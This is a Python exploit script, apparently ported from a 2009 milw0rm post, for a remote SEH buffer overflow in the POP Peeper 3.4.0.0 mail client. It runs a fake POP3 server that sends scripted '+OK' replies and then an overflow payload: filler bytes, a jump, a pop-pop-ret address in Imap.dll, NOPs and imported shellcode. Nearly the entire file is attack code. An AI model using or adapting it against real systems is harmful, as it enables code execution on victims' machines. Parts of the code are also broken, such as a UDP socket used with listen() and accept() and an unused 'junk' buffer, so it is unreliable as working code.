#!/usr/bin/python
# [+] Bug : POP Peeper 3.4.0.0 (From) Remote Buffer Overflow Exploit (SEH)
# [+] Author : His0k4
# [+] Greetings : All friends and muslims HacKerS (DZ)

import socket
import struct
from struct import pack
from payload import buf
import time
def shell_attack(target_machine, target_port):


# win32_exec -  EXITFUNC=seh CMD=calc Size=343 Encoder=PexAlphaNum http://metasploit.com
   


    junk = b"\x41"*1989

    payload = b"\x42"*352
    payload += b"\xEB\x10\x90\x90" #jmp+10 (tan9iza ta3 10 mitrate :p)
    payload += b"\x4C\x51\x01\x10" #Universal pop pop ret (Imap.dll)
    payload += b"\x90"*19          #Nops chriki
    payload += buf	      #calculatrice ta3 100 da :p


    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind((target_machine, target_port))
    s.listen(1)
   
    c, addr = s.accept()
   

    c.send(b"+OK\r\n")
    c.recv(512)
    c.send(b"+OK\r\n")
    c.recv(512)
    c.send(b"+OK\r\n")
    c.recv(512)
    c.send(b"+OK 1 100\r\n")
    c.recv(512)
    c.send(b"+OK\r\n1 root\r\n.\r\n")
    c.recv(512)
    c.send(b"+OK\r\n1 t00r\r\n.\r\n")
    c.recv(512)
    c.send(payload)

  
    c.close()
    s.close()

    # milw0rm.com [2009-03-20]